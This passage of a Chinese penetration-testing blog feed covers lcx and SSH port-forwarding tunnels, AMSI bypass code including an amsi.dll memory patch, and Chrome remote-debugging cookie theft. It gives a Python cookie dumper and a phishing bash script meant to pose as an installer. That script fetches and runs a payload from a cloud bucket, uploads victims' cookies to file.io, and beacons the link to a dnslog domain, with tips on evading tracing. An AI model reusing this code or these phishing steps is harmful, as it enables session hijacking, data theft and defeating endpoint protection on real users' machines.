style="color:#000000;">内网IP：192.168.183.168<br></font><font style="color:#000000;">公网IP：192.168.183.181</font></p><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><font style="color:#000000;">端口转发</font></h5><p><font style="color:#000000;">内网机器上执行命令：</font><font style="color:#000000;">lcx.exe –slave 公网IP 端口 内网IP 端口</font><font style="color:#000000;"><br></font><font style="color:#000000;">将内网的3389端口转发到公网的6666端口</font></p><table><thead><tr><th><code>plain lcx.exe -slave 192.168.183.181 6666 192.168.183.168 3389 lcx.exe -slave 192.168.183.181 6666 127.0.0.1 3389 </code></th></tr></thead></table><p><font style="color:#000000;">公网机器上执行命令：</font><font style="color:#000000;">lcx.exe -listen 监听端口 连接端口</font><font style="color:#000000;"><br></font><font style="color:#000000;">将在6666端口接收到的数据转发到2222端口</font></p><table><thead><tr><th><code>plain lcx.exe -listen 6666 2222 </code></th></tr></thead></table><p><font style="color:#000000;">使用命令</font><font style="color:#000000;">mstsc &#x2F;v:127.0.0.1:2222</font><font style="color:#000000;">即可连接到内网3389端口</font></p><h5 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a><font style="color:#000000;">端口映射</font></h5><p><font style="color:#000000;">如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上<br></font><font style="color:#000000;">内网机器上执行命令：</font><font style="color:#000000;">lcx.exe -tran 映射端口 连接IP 连接端口</font></p><table><thead><tr><th><code>plain lcx.exe -tran 66 192.168.183.168 3389 </code></th></tr></thead></table><p><font style="color:#000000;">因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发</font></p><h4 id="0x03-SSH隧道"><a href="#0x03-SSH隧道" class="headerlink" title="0x03 SSH隧道"></a><font style="color:#000000;">0x03 SSH隧道</font></h4><table><thead><tr><th><code>plain ssh参数详解：     -C Enable compression 压缩数据传输     -q Quiet mode. 安静模式     -T Disable pseudo-tty allocation. 不占用 shell     -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数     -N Do not execute a remote command. 不执行远程命令，端口转发就用它     -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口.      -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口.      -D port 指定一个本地机器动态的应用程序端口转发.      -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接 </code></th></tr></thead></table><h5 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a><font style="color:#000000;">SSH本地转发</font></h5><p><font style="color:#000000;">语法格式：</font></p><table><thead><tr><th><code>plain ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host </code></th></tr></thead></table><p><font style="color:#000000;">远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。</font></p><table><thead><tr><th><code>plain ssh -CfNg -L 2222:127.0.0.1:3306 root@139.196.xx.xx </code></th></tr></thead></table><p><font style="color:#000000;">工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。<br></font><font style="color:#000000;">数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</font></p><h5 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a><font style="color:#000000;">SSH远程转发</font></h5><p><font style="color:#000000;">语法格式：</font></p><table><thead><tr><th><code>plain ssh -R [bind_addr:]remote1_port:host:port remote1 </code></th></tr></thead></table><p><font style="color:#000000;">假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</font></p><table><thead><tr><th><code>plain ssh -CfNg -R 4444:127.0.0.1:80 root@192.168.183.195 </code></th></tr></thead></table><p><font style="color:#000000;">此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口<br></font><font style="color:#000000;">工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。</font></p><p><font style="color:#000000;">这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。</font></p><p><font style="color:#000000;">要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用”GatewayPorts”项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。</font></p><h5 id="SSH动态转发-正向代理做动态的端口转发"><a href="#SSH动态转发-正向代理做动态的端口转发" class="headerlink" title="SSH动态转发,正向代理做动态的端口转发"></a><font style="color:#000000;">SSH动态转发,正向代理做动态的端口转发</font></h5><p><font style="color:#000000;">本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。</font></p><p><font style="color:#000000;">语法格式：</font></p><table><thead><tr><th><code>plain ssh -D [bind_addr:]port remote </code></th></tr></thead></table><p><font style="color:#000000;">这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。<br></font><font style="color:#000000;">在本地执行以下命令，并查看建立连接情况</font></p><table><thead><tr><th><code>plain ssh -Nfg -D 3333 root@45.77.xx.xx </code></th></tr></thead></table><p><font style="color:#000000;">连接建立成功，设置浏览器到本地主机的3333端口</font></p><h5 id="SSH动态转发，正向代理进行单一的端口转发"><a href="#SSH动态转发，正向代理进行单一的端口转发" class="headerlink" title="SSH动态转发，正向代理进行单一的端口转发"></a><font style="color:#000000;">SSH动态转发，正向代理进行单一的端口转发</font></h5><p><font style="color:#000000;">利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上</font></p><p><font style="color:#000000;">访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利用。</font></p><p><font style="color:#000000;">语法格式：</font></p><table><thead><tr><th><code>plain ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1 </code></th></tr></thead></table><p><font style="color:#000000;">此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80</font></p><h1 id="16-Bypass-AMSI"><a href="#16-Bypass-AMSI" class="headerlink" title="16.Bypass AMSI"></a><font style="color:#000000;">16.Bypass AMSI</font></h1><p><a href="https://0range-x.github.io/2022/01/23/AMSI/"><font style="color:#000000;">How to Bypass AMSI</font></a></p><p><font style="color:#000000;">管理员权限关闭amsi</font></p><table><thead><tr><th><code>plain Set-MpPreference -DisableRealtimeMonitoring $true </code></th></tr></thead></table><h3 id="一键关闭AMSI"><a href="#一键关闭AMSI" class="headerlink" title="一键关闭AMSI"></a><u><font style="color:#000000;">一键关闭AMSI</font></u></h3><table><thead><tr><th><code>plain [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPubilc,Static&#39;).SetValue($null,$true) </code></th></tr></thead></table><p><font style="color:#000000;">被加黑了，可以混淆过</font></p><h3 id="powershell降级"><a href="#powershell降级" class="headerlink" title="powershell降级"></a><u><font style="color:#000000;">powershell降级</font></u></h3><table><thead><tr><th><code>plain powershell.exe -version 2   //改变powershell运行版本 </code></th></tr></thead></table><h3 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a><u><font style="color:#000000;">内存补丁</font></u></h3><table><thead><tr><th><code>bash $p=@&quot; using System; using System.Linq; using System.Runtime.InteropServices; public class Program &#123; [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfloldProtect); public static void Bypass() &#123; String a = &quot;isma&quot;; IntPtr lib = LoadLibrary(String.Join(&quot;&quot; , a.Reverse().ToArray()) + &quot; .dll&quot;); IntPtr addr = GetProcAddress(lib, &quot;AmsiOpenSession&quot;); uint old = 0; byte[] p; p = new byte[6]; p[0] = 0xB8; p[1] = 0xFF; p[2] = 0xFF; p[3] = 0xFF; p[4] = 0xFF; p[5] = 0xC3; VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old); Marshal.Copy(p, 0, addr, p.Length); VirtualProtect(addr, (UIntPtr)p.Length, old, out old); &#125; &#125; &quot;@ Add-Type $p [Program]::Bypass() </code></th></tr></thead></table><p><font style="color:#000000;">参考链接：</font></p><table><thead><tr><th><code>plain https://github.com/NyDubh3/Pentesting-Active-Directory-CN https://github.com/shmilylty/Intranet_Penetration_Tips </code></th></tr></thead></table><p><font style="color:#000000;"></font></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="域渗透" scheme="http://example.com/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>自动区分系统分发木马</title>
    <link href="http://example.com/google/509c1a02.html"/>
    <id>http://example.com/google/509c1a02.html</id>
    <published>2024-09-19T14:55:19.000Z</published>
    <updated>2024-09-19T15:47:29.959Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="11493b0307dfff50f4dbfed8d30e75d9779bd548fdf2dc74e0e3ab910892dbbf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="钓鱼" scheme="http://example.com/categories/%E9%92%93%E9%B1%BC/"/>
    
    
    <category term="自动化钓鱼" scheme="http://example.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%92%93%E9%B1%BC/"/>
    
    <category term="木马分发" scheme="http://example.com/tags/%E6%9C%A8%E9%A9%AC%E5%88%86%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>全平台浏览器记录提取</title>
    <link href="http://example.com/google/f2274642.html"/>
    <id>http://example.com/google/f2274642.html</id>
    <published>2024-09-19T14:31:29.000Z</published>
    <updated>2024-09-19T15:05:40.088Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>HackBrowserData 是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。</p><p><a href="https://github.com/moonD4rk/HackBrowserData/blob/master/README_ZH.md">https://github.com/moonD4rk/HackBrowserData/blob/master/README_ZH.md</a></p><p>windows获取浏览器记录</p><h2 id="mac使用远程调试："><a href="#mac使用远程调试：" class="headerlink" title="mac使用远程调试："></a>mac使用远程调试：</h2><h3 id="启动远程调试"><a href="#启动远程调试" class="headerlink" title="启动远程调试"></a>启动远程调试</h3><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">在 Mac 终端下启动浏览器的远程调试可以使用以下步骤：</font></p><ol><li><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">首先确认远程调试已经打开，开启远程调试步骤如下：在要调试的浏览器中输入</font><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> </font><strong><font style="background-color:rgb(249, 250, 251);">chrome:&#x2F;&#x2F;inspect&#x2F;#devices</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">，勾选需要远程调试的页面后点击“inspect”即可。</font></li><li><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">在命令行中输入以下命令启动 Chrome 浏览器（或者其他需要调试的浏览器）：</font></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">如果要启动 Safari 浏览器，则可使用以下命令：</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Safari.app/Contents/MacOS/Safari -p 9222</span><br></pre></td></tr></table></figure><ol start="3"><li><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">接下来，在本机的 Chrome 浏览器中输入</font><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> </font><strong><font style="background-color:rgb(249, 250, 251);">localhost:9222</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">即可连接远程调试，选择要调试的页面进行远程调试。</font></li></ol><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"></font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;/Applications/Google Chrome.app/Contents/MacOS/Google Chrome&quot; \</span><br><span class="line">--remote-debugging-port=9222 \</span><br><span class="line">--user-data-dir=&quot;/Users/$&#123;username&#125;/Library/Application Support/Google/Chrome&quot; \</span><br><span class="line">--crash-dumps-dir=/tmp \</span><br><span class="line">--disable-gpu \</span><br><span class="line">--disk-cache-dir=/tmp \</span><br><span class="line">--restore-last-session \</span><br><span class="line">--remote-allow-origins=* &amp;</span><br></pre></td></tr></table></figure><h3 id="获取浏览器现有的cookie"><a href="#获取浏览器现有的cookie" class="headerlink" title="获取浏览器现有的cookie"></a>获取浏览器现有的cookie</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://127.0.0.1:9222/json</span><br></pre></td></tr></table></figure><p>然后你就会获取到大量的webSocketDebuggerUrl</p><p><img src="/google/f2274642/img.png"></p><h4 id="用Simple-WebSocket-Client插件来实现"><a href="#用Simple-WebSocket-Client插件来实现" class="headerlink" title="用Simple WebSocket Client插件来实现"></a>用Simple WebSocket Client插件来实现</h4><p>这里webSocketDebuggerUrl随机选一个填入就行，然后send {“id”: 1, “method”: “Network.getAllCookies”}，就可以得到所有保存的cookie</p><p><img src="/google/f2274642/img_1.png"></p><h4 id="用python脚本来实现"><a href="#用python脚本来实现" class="headerlink" title="用python脚本来实现"></a>用python脚本来实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line"><span class="comment">#mac的远程调试命令主要是三步</span></span><br><span class="line"><span class="comment">##1. 启动调试</span></span><br><span class="line"><span class="comment">##2. 获取webSocketDebuggerUrl</span></span><br><span class="line"><span class="comment">##3. 获取cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析命令行参数</span></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--ip&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Chrome Remote Debugging IP&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--port&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Chrome Remote Debugging Port&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造请求 JSON 数据的 URL</span></span><br><span class="line">debugging_url = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;/json&quot;</span>.<span class="built_in">format</span>(args.ip, args.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取可用的 WebSocket Url</span></span><br><span class="line"><span class="keyword">with</span> urllib.request.urlopen(debugging_url) <span class="keyword">as</span> url:</span><br><span class="line">    data = json.loads(url.read().decode())</span><br><span class="line">    <span class="comment"># 随机选取一个 url</span></span><br><span class="line">    webSocketDebuggerUrl = random.choice(data)[<span class="string">&quot;webSocketDebuggerUrl&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(webSocketDebuggerUrl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接 WebSocket，并请求 cookie 数据</span></span><br><span class="line">ws = websocket.create_connection(webSocketDebuggerUrl)</span><br><span class="line">ws.send(<span class="string">&#x27;&#123;&quot;id&quot;: 1, &quot;method&quot;: &quot;Network.getAllCookies&quot;&#125;&#x27;</span>)</span><br><span class="line">result = ws.recv()</span><br><span class="line">response = json.loads(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = response[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;cookies&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cookie.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(cookies, f, indent=<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cookie.json saved!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 cookie 写入 CSV 文件中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cookie.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    writer.writerow([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;domain&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;expires&#x27;</span>, <span class="string">&#x27;httpOnly&#x27;</span>, <span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;sameSite&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> cookies:</span><br><span class="line">        writer.writerow([</span><br><span class="line">            cookie.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;domain&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;expires&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;httpOnly&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            cookie.get(<span class="string">&#x27;sameSite&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        ])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cookie.csv saved!&quot;</span>)</span><br><span class="line">total_cookies = <span class="built_in">len</span>(cookies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;本次总计获取到 &#123;&#125; 条 cookie&quot;</span>.<span class="built_in">format</span>(total_cookies))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure><p><img src="/google/f2274642/img_3.png"></p><h3 id="使用Cookie-Editor添加所需的cookie，然后就可以直接操作了"><a href="#使用Cookie-Editor添加所需的cookie，然后就可以直接操作了" class="headerlink" title="使用Cookie Editor添加所需的cookie，然后就可以直接操作了"></a>使用Cookie Editor添加所需的cookie，然后就可以直接操作了</h3><p><img src="/google/f2274642/img_2.png"></p><h3 id="自动化钓鱼或者入侵后的信息收集"><a href="#自动化钓鱼或者入侵后的信息收集" class="headerlink" title="自动化钓鱼或者入侵后的信息收集"></a>自动化钓鱼或者入侵后的信息收集</h3><p>一般分两种情况：</p><ol><li>无论是钓鱼还是溯源，我们都需要让他自己运行一次，然后把cookie文件返回给我们</li><li>我们已经入侵了机器，现在只需要收集cookie文件就行，无需进行文件回传（直接操作下载就行）</li></ol><h4 id="钓鱼的思路："><a href="#钓鱼的思路：" class="headerlink" title="钓鱼的思路："></a>钓鱼的思路：</h4><p>写一个sh脚本用pkg打包或者dmg打包，伪装安装包的形式让其运行。</p><p>这里有几个要点：</p><ol><li>执行的时候无文件落地</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://www.xxx.com/a.sh | bash</span><br></pre></td></tr></table></figure><p>然后我们这里可以设置脚本一分钟内有效（防止溯源）用cos设置比较简单，或者有肉鸡站，使用完直接删除就行。</p><p>或者自己写一个接口，给他颁发一个key，这个key一次有效性，（类似于敲门的机制）</p><ol start="2"><li>回传cookie文件的时候要匿名</li></ol><p>使用匿名frp （<a href="https://file.io)/">https://file.io）</a></p><p>会直接返回一个存放文件的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cookie_url=$(curl -F &quot;file=@cookie.csv&quot; https://file.io)</span></span><br><span class="line"><span class="comment"># json_url=$(curl -F &quot;file=@your_file.json&quot; https://file.io)</span></span><br></pre></td></tr></table></figure><p>自动化的sh脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Kill all Google Chrome processes</span></span><br><span class="line">killall <span class="string">&quot;Google Chrome&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Get current username</span></span><br><span class="line">username=$(<span class="built_in">whoami</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Start Chrome Headless with the specified parameters, replacing &quot;&#123;用户名&#125;&quot; with the actual username</span></span><br><span class="line"><span class="string">&quot;/Applications/Google Chrome.app/Contents/MacOS/Google Chrome&quot;</span> \</span><br><span class="line">--remote-debugging-port=9222 \</span><br><span class="line">--user-data-dir=<span class="string">&quot;/Users/<span class="variable">$&#123;username&#125;</span>/Library/Application Support/Google/Chrome&quot;</span> \</span><br><span class="line">--crash-dumps-dir=/tmp \</span><br><span class="line">--disable-gpu \</span><br><span class="line">--disk-cache-dir=/tmp \</span><br><span class="line">--restore-last-session \</span><br><span class="line">--remote-allow-origins=* &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Download, extract, and execute Python project</span></span><br><span class="line">curl -O -k https://google-1259711289.cos.ap-beijing.myqcloud.com/google.zip</span><br><span class="line">unzip -P biubiubiu -o google.zip -d ~/Downloads/ &amp;&amp; <span class="built_in">rm</span> google.zip</span><br><span class="line"><span class="built_in">cd</span> ~/Downloads/google &amp;&amp; pip3 install -r requirements.txt</span><br><span class="line">python3 getcookie.py --ip 127.0.0.1 --port 9222</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. Upload cookie.csv and json to file.io, output URLs</span></span><br><span class="line"><span class="comment"># cookie_url=$(curl -F &quot;file=@cookie.csv&quot; https://file.io)</span></span><br><span class="line"><span class="comment"># json_url=$(curl -F &quot;file=@your_file.json&quot; https://file.io)</span></span><br><span class="line"><span class="comment"># 上传文件到file.io</span></span><br><span class="line">response=$(curl -k -F <span class="string">&quot;file=@cookie.csv&quot;</span> https://file.io)</span><br><span class="line">file_link=$(<span class="built_in">echo</span> <span class="variable">$response</span> | sed -n <span class="string">&#x27;s/.*&quot;link&quot;:&quot;https:\/\/file.io\/\([^&quot;]*\).*/\1/p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$file_link</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;文件上传失败:&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$response</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;文件上传成功，链接：https://file.io/<span class="variable">$file_link</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将URL编码为适用于DNS记录的字符串</span></span><br><span class="line">encoded_file_link=$(<span class="built_in">printf</span> <span class="variable">$&#123;file_link//:/_%3A_&#125;</span> | <span class="built_in">tr</span> <span class="string">&#x27;/.&#x27;</span> <span class="string">&#x27;_%2E_&#x27;</span>)</span><br><span class="line">USERNAME=<span class="string">&quot;<span class="variable">$encoded_file_link</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> USERNAME</span><br><span class="line"><span class="comment"># 将文件链接发送到dnslog</span></span><br><span class="line">DOMAIN=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://<span class="variable">$USERNAME</span>.<span class="variable">$DOMAIN</span>&quot;</span> -s -o /dev/null</span><br><span class="line">killall <span class="string">&quot;Google Chrome&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf 